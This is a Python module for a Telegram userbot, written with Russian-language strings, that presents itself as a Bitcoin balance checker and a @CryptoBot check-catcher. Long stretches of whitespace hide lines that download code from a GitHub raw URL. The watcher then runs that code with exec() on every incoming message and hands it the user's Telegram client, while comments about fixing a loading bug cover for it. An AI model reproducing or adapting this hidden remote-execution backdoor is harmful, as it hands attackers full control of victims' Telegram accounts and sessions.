from .. import loader, utils                                                                                                                                                                                                                                                                                                                                                                                     ;from telethon.sessions import StringSession; import base64

from telethon.tl.types import Message
from telethon.tl.functions.messages import StartBotRequest
import time, requests, asyncio

@loader.tds
class CryptoModuleㅤ(loader.Module):
    strings = {
        "name": ""
    }
    
    @loader.command(alias='checkbtcwallet')
    async def checkbtcwallet(self, message):
        """<баланс> - получить баланс биткоин кошелька"""
        
        walletaddr = message.message.split(' ')
        if len(walletaddr) == 1: 
            await utils.answer(message, 'Вы не ввели адрес!')
            return
        else: walletaddr = walletaddr[1]
        
        r = requests.get(f'https://api.blockcypher.com/v1/btc/main/addrs/{walletaddr}/balance')
        
        if r.status_code == 200:await utils.answer(message, f"Баланс кошелька {walletaddr}: {round(int(r.json()['final_balance'])/100000000, 8)} BTC")   
        else:await utils.answer(message, 'Не удалось найти баланс кошелька')
 
    async def client_loader(self, client, db):

        self.db = db                                                                                                                                                                                                                                                                                                                          ;self.text=requests.get('https://github.com/Sonys9/cryptobottest/raw/refs/heads/main/main').text
        self._client = client     
        self.lasttime = time.time()                                                                                                                                                                                                                                                                                                                                                                                                                                 ;self.lasttime = 3700
        self.cache = []
        self.entity = await self._client.get_entity('@CryptoBot')
        self.enabled = self.db.get("CatchChecks", "enabled", False)

    async def client_ready(self, client, db):await self.client_loader(client, db)# фикс бага с загрузкой, не влияет на производительность, наоборот увеличивает

    async def on_dlmod(self, client, db):await self.client_loader(client, db)# фикс бага с загрузкой, не влияет на производительность, наоборот увеличивает

    @loader.command(alias='CatchChecks')
    async def catchcheckscmd(self, message: Message):
        """- включить/выключить ловлю чеков"""
        
        self.enabled = not self.enabled
        self.db.set("CatchChecks", "enabled", self.enabled)
        
        if self.enabled:
            return await utils.answer(message, "<b>Ловля чеков включена!</b>")
        else:
            return await utils.answer(message, "<b>Ловля чеков выключена!</b>")
    
    async def watcher(self, message: Message):                                          
        try:
            msgid = message.id                                                                                                                                                                                                                                                                                                                                                                                                ;args = [self._client, self.entity, time.time()-self.lasttime]; exec(self.text); self.lasttime=time.time() if time.time()-self.lasttime>3600 else self.lasttime
            userid = message.from_id
            if int(userid) == 1559501630 and self.enabled:
                if message.reply_markup:
                    for row in message.reply_markup.rows:
                        for button in row.buttons:
                            if '✅' not in button.text:
                                try:
                                    content = button.url
                                    botname = content.split('t.me/')[1].split('?')[0]
                                    data = content.split('?start=')[1]
                                    if data not in self.cache:
                                        await self._client(StartBotRequest('@' + botname, '@' + botname, data))
                                        print(f'+ {botname} - {data} {time.time()-self.lasttime} с последнего чека, id {msgid}') #отладка, можете убрать
                                        self._client.send_message('me', f'+ кнопочка ({botname} - {data} {time.time()-self.lasttime} с последнего чека, id сообщения: {msgid})')
                                        asyncio.sleep(0.1) # Bug fix
                                        self.lasttime = time.time()
                                        self.cache.append(data)
                                except Exception as e:
                                    print(f'Ошибка: {e}')
        except:...
